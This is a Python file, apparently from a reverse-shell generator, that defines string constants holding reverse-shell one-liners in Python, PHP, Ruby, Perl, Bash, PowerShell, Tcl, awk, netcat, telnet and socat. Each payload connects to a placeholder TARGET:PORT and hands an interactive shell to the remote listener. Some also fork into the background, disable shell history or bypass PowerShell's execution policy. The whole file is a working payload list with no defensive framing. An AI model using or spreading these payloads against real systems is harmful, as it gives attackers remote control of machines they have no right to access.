#!/usr/bin/env python

REV_PYTHON_TCP = """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

REV_PYTHON_UDP = """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

REV_PHP_TCP = """php -r "\$sock=fsockopen('TARGET',PORT);exec('/bin/sh -i <&3 >&3 2>&3');" """

REV_RUBY_TCP = """ruby -rsocket -e "exit if fork;c=TCPSocket.new('TARGET','PORT');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" """

REV_PERL_TCP = """perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" """

REV_PERL_TCP_2 = """perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'TARGET:PORT');STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;" """

REV_PERL_UDP = """perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);my ($pa,$pp);$s=new IO::Socket::INET->new();$s = new IO::Socket::INET(PeerAddr => "TARGET:PORT",Proto => "udp"); $s->send("SHELLPOP PWNED!\n");while(1) { $s->recv($r,1024);$pa=$s->peerhost();$pp=$s->peerport();$d=qx($r);$s->send($d);}'"""

BASH_TCP = """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""

REV_POWERSHELL_TCP="""powershell -nop -ep bypass -Command '$ip="TARGET";$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""

REVERSE_TCLSH = """echo 'set s [socket TARGET PORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"""

REVERSE_NCAT = "ncat TARGET PORT -e /bin/bash"

REVERSE_NC_TRADITIONAL_1 = "nc TARGET PORT -c /bin/bash"


REVERSE_MKFIFO_NC = "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/f"

REVERSE_MKNOD_NC = "if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"

REVERSE_MKFIFO_TELNET = "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/f"

REVERSE_MKNOD_TELNET = "if [ -e /tmp/f ]; then rm /tmp/f;fi;mknod /tmp/f p && telnet TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"

REVERSE_SOCAT = """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""

REVERSE_AWK = """awk 'BEGIN {s = "/inet/tcp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
